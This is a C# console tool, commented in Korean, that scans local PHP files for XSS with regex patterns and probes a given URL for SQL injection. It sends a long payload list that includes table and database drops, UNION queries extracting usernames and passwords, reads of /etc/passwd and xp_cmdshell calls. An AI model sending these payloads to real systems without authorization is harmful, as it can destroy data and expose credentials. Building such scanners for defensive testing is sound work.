using System;
using System.IO;
using System.Text.RegularExpressions;
using System.Net.Http;
using System.Threading.Tasks;
using System.Collections.Generic;

namespace VulnerabilityScanner
{
    public static class Suggestions
    {
        // 사용자로부터 폴더 경로를 입력받고 PHP 파일을 스캔
        public static async Task suggetions()
        {
            // 사용자로부터 폴더 경로 입력받기
            Console.Write("탐색할 폴더 경로를 입력하세요: ");
            string folderPath = Console.ReadLine();

            if (string.IsNullOrEmpty(folderPath) || !Directory.Exists(folderPath))
            {
                Console.WriteLine("유효하지 않은 폴더 경로입니다.");
                return;
            }

            // 각 .php 파일의 내용을 읽어서 변수에 저장
            List<string> phpFiles = GetPhpFiles(folderPath);

            if (phpFiles.Count == 0)
            {
                Console.WriteLine("지정된 폴더에 .php 파일이 없습니다.");
                return;
            }

            // 각 .php 파일의 내용을 읽어서 출력 또는 취약점 스캔
            foreach (string filePath in phpFiles)
            {
                ScanForXssWithLineNumbers(filePath);
            }
        }

        // 특정 폴더에서 .php 파일을 탐지하는 함수
        private static List<string> GetPhpFiles(string folderPath)
        {
            List<string> phpFiles = new List<string>();

            try
            {
                // 모든 .php 파일을 검색
                string[] files = Directory.GetFiles(folderPath, "*.php", SearchOption.AllDirectories);

                // 리스트에 파일 경로 추가
                phpFiles.AddRange(files);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"폴더 접근 중 오류 발생: {ex.Message}");
            }

            return phpFiles;
        }

        // XSS 취약점 스캔 (라인 번호 포함)
        private static void ScanForXssWithLineNumbers(string filePath)
        {
            Console.WriteLine($"\n{filePath} 파일에서 XSS 취약점 스캔 중...");

            // XSS 패턴 정의
            string[] xssPatterns = new string[]
            {
                @"<script.*?>.*?</script>",  // 스크립트 태그
                @"javascript:.*",            // 자바스크립트 호출
                @"<img.*?onerror=.*?>",       // 이미지 태그에 onerror 이벤트
                @"<.*?onmouseover=.*?>",       // onmouseover 이벤트
                @"<iframe.*?>.*?</iframe>",   // iframe 태그
                @"<.*?on\w+=.*?>",            // 모든 on 이벤트 핸들러
                @"<.*?style=.*?>",            // style 속성
                @"<object.*?>.*?</object>",   // object 태그
                @"data:text/javascript;base64,.*", // base64 인코딩된 자바스크립트
                @"<script\s+src=.*?>"         // src 속성이 있는 script 태그
            };
            int detectedxssCount = 0;
            try
            {
                using (StreamReader reader = new StreamReader(filePath))
                {
                    string line;
                    int lineNumber = 0;
                    bool found = false;

                    // 파일을 한 줄씩 읽음
                    while ((line = reader.ReadLine()) != null)
                    {
                        lineNumber++;

                        foreach (var pattern in xssPatterns)
                        {
                            // XSS 패턴을 검색
                            if (Regex.IsMatch(line, pattern, RegexOptions.IgnoreCase))
                            {
                                detectedxssCount++;
                                found = true;
                                Console.WriteLine($"[XSS] 라인 {lineNumber}: {line.Trim()}");
                            }
                        }
                    }

                    if (!found)
                    {
                        Console.WriteLine("XSS 취약점이 발견되지 않았습니다.");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"파일 스캔 중 오류 발생: {ex.Message}");
            }
            Console.WriteLine($"[XSS] 발견됨: {detectedxssCount}개 잠재적인 XSS 취약점");
        }

        // XSS 취약점 스캔 (웹 페이지에 대한)
        private static void ScanForXss(string pageSource)
        {
            Console.WriteLine("\nXSS 취약점 스캔 중...");

            string[] xssPatterns = new string[]
            {
                @"<script.*?>.*?</script>",  // 스크립트 태그
                @"javascript:.*",            // 자바스크립트 호출
                @"<img.*?onerror=.*?>",       // 이미지 태그에 onerror 이벤트
                @"<.*?onmouseover=.*?>"       // onmouseover 이벤트
            };
            int detectedxssCount = 0;

            foreach (var pattern in xssPatterns)
            {
                MatchCollection matches = Regex.Matches(pageSource, pattern, RegexOptions.IgnoreCase);
                if (matches.Count > 0)
                {
                    detectedxssCount++;
                    Console.WriteLine($"[XSS] 발견됨: {matches.Count}개 잠재적인 XSS 취약점:");
                    foreach (Match match in matches)
                    {
                        Console.WriteLine($" - {match.Value}");
                    }
                }
            }

            if (detectedxssCount > 0)
            {
                Console.WriteLine($"\n총 {detectedxssCount}개의 XSS 취약점이 발견되었습니다.");
            }
            else
            {
                Console.WriteLine("XSS 취약점이 발견되지 않았습니다.");
            }
        }

        // XSS 및 SQL Injection 취약점 스캐너 (웹 페이지에 대한)
        public static async Task ScanForXssAndSqlInjection(string url)
        {
            try
            {
                string pageSource = await GetPageSourceAsync(url);
                if (!string.IsNullOrEmpty(pageSource))
                {
                    ScanForXss(pageSource);
                    await ScanForSqlInjection(url);  // URL을 활용하여 SQL Injection 공격 시도
                }
                else
                {
                    Console.WriteLine("페이지 소스를 가져올 수 없습니다.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"오류 발생: {ex.Message}");
            }
        }

        // 웹 페이지 소스 가져오기
        private static async Task<string> GetPageSourceAsync(string url)
        {
            using (HttpClient client = new HttpClient())
            {
                HttpResponseMessage response = await client.GetAsync(url);
                if (response.IsSuccessStatusCode)
                {
                    return await response.Content.ReadAsStringAsync();
                }
                else
                {
                    Console.WriteLine($"Failed to access {url}. Status Code: {response.StatusCode}");
                    return null;
                }
            }
        }


        // SQL Injection 취약점 스캔 (웹 페이지에 대한)
        private static async Task ScanForSqlInjection(string url)
        {
            Console.WriteLine("\nSQL Injection 취약점 스캔 중...");

            string[] sqlInjectionPayloads = new string[]
            {
                // 기본 SQL Injection 패턴
                "' OR 1=1--",
                "' OR 'a'='a'--",    

                // UNION 기반 SQL Injection
                "' UNION SELECT NULL--",
                "' OR 1=0 UNION SELECT username, password FROM users--",

                // 데이터베이스 정보 추출
                "' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name = 'users'--",

                // 블라인드 SQL Injection - 참/거짓 조건 사용
                "' AND 1=1--",       // 항상 참
                "' AND 1=0--",       // 항상 거짓

                // 시간 기반 블라인드 SQL Injection (MySQL)
                "' OR IF(1=1, SLEEP(5), 0)--",  // 1=1이면 5초 지연
                "' OR IF(1=0, SLEEP(5), 0)--",  // 1=0이므로 지연 없음

                // 오류 기반 SQL Injection
                "' OR 1=1; DROP TABLE users--",  // 테이블 삭제 시도
                "' OR 1=1; SELECT version()--",  // MySQL 버전 확인
                "' OR 1=1; SELECT database()--", // 현재 데이터베이스 이름 확인

                // 논리적 오류 유발 SQL Injection
                "' AND 1=CONVERT(int, 'abc')--",  // 데이터 유형 불일치 유발
                "' AND (SELECT COUNT(*) FROM users) > 0--", // 데이터 존재 여부 확인

                // 댓글 스타일 주석을 사용한 패턴 (다양한 DBMS에서 주석을 달리 처리할 수 있음)
                "' OR 1=1/*",   // 주석으로 나머지 쿼리 무시
                "' OR 'a'='a'/*", // 주석으로 쿼리 무시

                // 다중 쿼리 실행 시도 (MySQL에 주로 해당)
                "'; DROP TABLE users;--",
                "'; SELECT * FROM information_schema.tables;--",

                // 특수 문자 기반 SQL Injection
                "' OR ''='",   // 빈 문자열 비교
                "' OR ' ' = '", // 공백 문자 비교
                "' OR ''='';--", // 빈 문자열로 SQL 무력화

                // 복합 SQL Injection
                "'; SELECT load_file('/etc/passwd')--",  // 서버 파일 읽기 시도 (MySQL)
                "' AND 1=1 UNION SELECT NULL, NULL, NULL--",  // 다중 컬럼 SELECT 시도
                "' OR EXISTS(SELECT * FROM users)--",   // 레코드 존재 여부 확인
                "' AND EXISTS(SELECT 1)--",             // 논리적 참 확인

                // NoSQL Injection (MongoDB, 등)
                "' OR { '$ne': null }--",  // NoSQL에서의 조건 변조
                "' OR { '$gt': '' }--",    // 대소 비교를 통한 NoSQL Injection

                // 추가 SQL Injection 패턴
                // 다양한 조건문 조합
                "' AND '1'='1' /*",    // 주석을 사용한 조건
                "' OR '1'='1' /*",     // 주석을 사용한 조건

                // 문자열 연결을 통한 공격
                "'; EXEC xp_cmdshell('whoami');--", // SQL Server의 xp_cmdshell 사용
                "'; DROP DATABASE test;--",          // 데이터베이스 삭제 시도

                // 배열 기반 쿼리
                "' AND (SELECT COUNT(*) FROM users) > 0;--", // 존재하는 레코드 수 확인

                // 서브쿼리 활용
                "' AND (SELECT TOP 1 username FROM users) IS NOT NULL--", // 사용자 존재 여부 확인

                // 해킹 도구에서 사용되는 복합적인 패턴
                "' UNION SELECT password FROM users WHERE '1'='1'--", // 비밀번호 추출 시도
                "'; SELECT * FROM (SELECT username, password FROM users) AS derived--", // 서브쿼리 사용

                // 스팸 주석과 다양한 주석 처리
                "' OR 1=1 #",     // #로 주석 처리
                "' OR 1=1 -- ",   // 공백 후 주석 처리

                // NoSQL Injection 관련 추가 패턴
                "' OR { '$eq': null }--", // NoSQL에서의 조건 변조
                "' OR { '$exists': true }--", // 필드 존재 여부 확인

                // 복잡한 다중 조건
                "' OR 1=1 UNION ALL SELECT username, password FROM users--", // UNION ALL 사용
                "' OR (SELECT COUNT(*) FROM information_schema.tables) > 0--", // 테이블 존재 여부 확인

                // 잘못된 타입 캐스팅 시도
                "' AND 1=CAST('a' AS INT)--", // 타입 불일치
                "' AND 1=CONVERT(VARCHAR, GETDATE())--", // 날짜 형식 변환

                // 데이터베이스 특정 함수 사용
                "'; SELECT DATABASE();--", // 현재 데이터베이스 이름 확인
                "'; SELECT USER();--"      // 현재 사용자 확인
             };

            int detectedsqlCount = 0;

            foreach (var payload in sqlInjectionPayloads)
            {
                string vulnerableUrl = $"{url}?param={Uri.EscapeDataString(payload)}";
                Console.WriteLine($"Testing: {vulnerableUrl}");

                string result = await SendHttpRequest(vulnerableUrl);

                if (IsSqlInjectionDetected(result))
                {
                    detectedsqlCount++;
                    Console.WriteLine($"[취약] SQL Injection 발견됨! 페이로드: {payload}");
                    return;
                }
            }
            if (detectedsqlCount > 0)
            {
                Console.WriteLine($"\n총 {detectedsqlCount}개의 SQL Injection 취약점이 발견되었습니다.");
            }
            else
            {
                Console.WriteLine("SQL Injection 취약점이 발견되지 않았습니다.");
            }
        }

        private static async Task<string> SendHttpRequest(string url)
        {
            using (HttpClient client = new HttpClient())
            {
                HttpResponseMessage response = await client.GetAsync(url);
                return await response.Content.ReadAsStringAsync();
            }
        }

        private static bool IsSqlInjectionDetected(string responseContent)
        {
            return responseContent.Contains("SQL syntax") || responseContent.Contains("database error");
        }
    }
}
